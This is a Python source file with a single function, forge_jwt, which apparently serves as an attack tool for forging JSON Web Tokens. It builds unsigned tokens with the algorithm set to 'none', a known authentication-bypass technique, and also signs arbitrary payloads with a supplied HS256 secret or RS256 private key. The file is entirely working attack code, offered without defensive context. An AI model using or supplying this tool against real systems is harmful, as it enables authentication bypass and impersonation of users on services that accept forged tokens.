import base64
import json
import jwt

def forge_jwt(alg, payload_str, secret=None, privkey_path=None):
    try:
        payload = json.loads(payload_str)
    except json.JSONDecodeError:
        print("[!] Invalid payload format. Must be valid JSON.")
        return

    header = {"alg": alg, "typ": "JWT"}

    if alg == "none":
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        forged_token = f"{header_b64}.{payload_b64}."
        print("\n[+] Forged JWT (alg=none):")
        print(forged_token)
        return

    elif alg == "HS256":
        if not secret:
            print("[!] HS256 requires --secret to sign the token.")
            return
        token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
        print("\n[+] Forged JWT (HS256):")
        print(token)
        return

    elif alg == "RS256":
        if not privkey_path:
            print("[!] RS256 requires --privkey path to sign the token.")
            return
        try:
            with open(privkey_path, "r") as f:
                private_key = f.read()
        except Exception as e:
            print(f"[!] Failed to read private key: {e}")
            return
        token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
        print("\n[+] Forged JWT (RS256):")
        print(token)
        return

    else:
        print(f"[!] Unsupported algorithm: {alg}")
